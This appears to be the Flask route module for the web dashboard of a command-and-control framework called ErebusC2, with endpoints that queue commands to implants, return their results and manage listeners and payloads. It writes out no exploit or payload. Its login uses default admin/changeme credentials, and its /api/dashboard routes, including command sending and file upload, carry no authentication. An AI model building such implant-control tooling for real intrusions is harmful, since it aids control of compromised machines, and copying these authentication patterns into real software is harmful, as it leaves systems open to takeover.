"""
ErebusC2 Dashboard Routes
Handles HTTP routes for the dashboard UI
"""
import os
import logging
import json
from typing import Dict, Any, Optional
from flask import render_template, request, redirect, url_for, jsonify, abort, session, flash

# Set up module logger
logger = logging.getLogger("ErebusC2.Server.Dashboard")
logger.setLevel(logging.INFO)

# Store loaded implant modules
loaded_modules = {}

def init_routes(app, auth, server_instance):
    """Initialize dashboard routes
    
    Args:
        app: Flask application instance
        auth: Authentication decorator
        server_instance: ErebusC2Server instance
    """
    # Load implant modules
    load_implant_modules()

    @app.route('/login')
    def login_page():
        """Login page"""
        return render_template('login.html')
    
    @app.route('/login', methods=['POST'])
    def login_submit():
        """Process login form submission"""
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Load config to check credentials
        config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 
                                  'dashboard', 'dashboard_config.json')
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
        except Exception as e:
            config = {}
            logger.error(f"Failed to load config: {e}")
        
        if username == config.get('admin_username', 'admin') and \
           password == config.get('admin_password', 'changeme'):
            # Generate token and store in session
            token = server_instance.dashboard_server._generate_auth_token()
            session['auth_token'] = token
            session['username'] = username
            
            # Store token in local config to make it accessible to API
            server_instance.config['api'] = server_instance.config.get('api', {})
            server_instance.config['api']['token_secret'] = token
            
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password', 'danger')
            return redirect(url_for('login_page'))
    
    @app.route('/logout')
    def logout():
        """Log out user"""
        session.clear()
        return redirect(url_for('login_page'))
    
    @app.route('/')
    @auth.login_required
    def dashboard():
        """Dashboard home page"""
        return render_template('index.html')
    
    @app.route('/implants')
    @auth.login_required
    def implants_list():
        """Implants list page"""
        implants = server_instance.peer_tracker.get_implants()
        return render_template('implants.html', implants=implants)
    
    @app.route('/implant/<implant_id>')
    @auth.login_required
    def implant_detail(implant_id):
        """Implant detail page"""
        implant = server_instance.peer_tracker.get_implant(implant_id)
        if not implant:
            abort(404)
        
        # Get the appropriate template for this implant type
        template = 'implant_detail.html'  # Default template
        
        # Check if we have a specialized template for this implant type
        implant_type = implant.get('type', 'default')
        if implant_type in loaded_modules and 'template' in loaded_modules[implant_type]:
            template = loaded_modules[implant_type]['template']
        
        return render_template(template, implant=implant)
    
    @app.route('/listeners')
    @auth.login_required
    def listeners_list():
        """Listeners list page"""
        return render_template('listeners.html')
    
    @app.route('/operations')
    @auth.login_required
    def operations_list():
        """Operations list page"""
        return render_template('operations.html')
    
    @app.route('/payloads')
    @auth.login_required
    def payloads_list():
        """Payloads list page"""
        return render_template('payloads.html')
    
    @app.route('/settings')
    @auth.login_required
    def settings():
        """Settings page"""
        return render_template('settings.html')
    
    @app.route('/api/send_command', methods=['POST'])
    @auth.login_required
    def api_send_command():
        """API endpoint for sending commands to implants"""
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        implant_id = data.get('implant_id')
        command = data.get('command')
        
        if not implant_id or not command:
            return jsonify({'error': 'Missing required parameters'}), 400
        
        # Parse command to get type and params
        parts = command.split(' ', 1)
        command_type = parts[0]
        params = parts[1] if len(parts) > 1 else ''
        
        try:
            # Queue command
            command_id = server_instance.command_queue.add_command(
                implant_id=implant_id,
                command_type=command_type,
                params={'args': params}
            )
            
            return jsonify({
                'status': 'success',
                'command_id': command_id
            })
        
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/api/command_result/<command_id>')
    @auth.login_required
    def api_get_command_result(command_id):
        """API endpoint for getting command results"""
        command = server_instance.command_queue.get_command_result(command_id)
        
        if not command:
            return jsonify({'error': 'Command not found'}), 404
        
        return jsonify(command)
    
    @app.route('/api/health')
    @auth.login_required
    def api_health():
        """API endpoint for server health status"""
        # Get all implants and count active ones
        all_implants = server_instance.peer_tracker.get_implants()
        active_implants = [i for i in all_implants if i.get('status') == 'active']
        
        # Get listeners (relays)
        all_listeners = server_instance.peer_tracker.get_relays()
        active_listeners = [l for l in all_listeners if l.get('status') == 'active']
        
        return jsonify({
            'status': 'online',
            'uptime': server_instance.get_uptime(),
            'implants': {
                'total': len(all_implants),
                'active': len(active_implants)
            },
            'listeners': {
                'total': len(all_listeners),
                'active': len(active_listeners)
            }
        })
    
    # Connect dashboard server API routes to this app
    connect_dashboard_api_routes(app, server_instance)


def connect_dashboard_api_routes(app, server_instance):
    """Connect dashboard server API routes to the main Flask app
    
    Args:
        app: Flask application instance
        server_instance: ErebusC2Server instance
    """
    # Register dashboard server routes with the main app
    dashboard_server = server_instance.dashboard_server
    
    @app.route('/api/dashboard/status', methods=['GET'])
    def api_dashboard_status():
        return dashboard_server.app.view_functions['get_status']()
    
    @app.route('/api/dashboard/implants', methods=['GET'])
    def api_dashboard_implants():
        return dashboard_server.app.view_functions['get_implants']()
    
    @app.route('/api/dashboard/implants/<implant_id>', methods=['GET'])
    def api_dashboard_implant(implant_id):
        return dashboard_server.app.view_functions['get_implant'](implant_id)
    
    @app.route('/api/dashboard/implants/<implant_id>/command', methods=['POST'])
    def api_dashboard_send_command(implant_id):
        return dashboard_server.app.view_functions['send_implant_command'](implant_id)
    
    @app.route('/api/dashboard/commands', methods=['GET'])
    def api_dashboard_commands():
        return dashboard_server.app.view_functions['get_commands']()
    
    @app.route('/api/dashboard/commands/<command_id>', methods=['GET'])
    def api_dashboard_command(command_id):
        return dashboard_server.app.view_functions['get_command'](command_id)
    
    @app.route('/api/dashboard/commands/<command_id>/cancel', methods=['POST'])
    def api_dashboard_cancel_command(command_id):
        return dashboard_server.app.view_functions['cancel_command'](command_id)
    
    @app.route('/api/dashboard/network', methods=['GET'])
    def api_dashboard_network():
        return dashboard_server.app.view_functions['get_network']()
    
    @app.route('/api/dashboard/network/visualize', methods=['GET'])
    def api_dashboard_network_visualize():
        return dashboard_server.app.view_functions['visualize_network']()
    
    @app.route('/api/dashboard/files/upload', methods=['POST'])
    def api_dashboard_upload_file():
        return dashboard_server.app.view_functions['upload_file']()


def load_implant_modules():
    """Load implant modules and their templates"""
    global loaded_modules
    
    # Root directory for implant modules
    imps_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'imps')
    
    if not os.path.exists(imps_dir):
        logger.warning(f"Implant modules directory not found: {imps_dir}")
        return
    
    # Scan for implant modules
    for module_name in os.listdir(imps_dir):
        module_path = os.path.join(imps_dir, module_name)
        
        # Skip if not a directory
        if not os.path.isdir(module_path):
            continue
        
        # Check if this is a valid module (has __init__.py)
        init_path = os.path.join(module_path, '__init__.py')
        if not os.path.exists(init_path):
            continue
        
        try:
            # Import module
            module_info = {}
            
            # Try to load the module info
            module_path_spec = f"imps.{module_name}"
            try:
                import importlib
                module = importlib.import_module(module_path_spec)
                if hasattr(module, 'MODULE_INFO'):
                    module_info = module.MODULE_INFO
            except ImportError as e:
                logger.error(f"Error importing module {module_name}: {e}")
                continue
            
            # Store module info
            loaded_modules[module_name] = module_info
            logger.info(f"Loaded implant module: {module_name}")
            
        except Exception as e:
            logger.error(f"Error loading module {module_name}: {e}")
    
    logger.info(f"Loaded {len(loaded_modules)} implant modules")
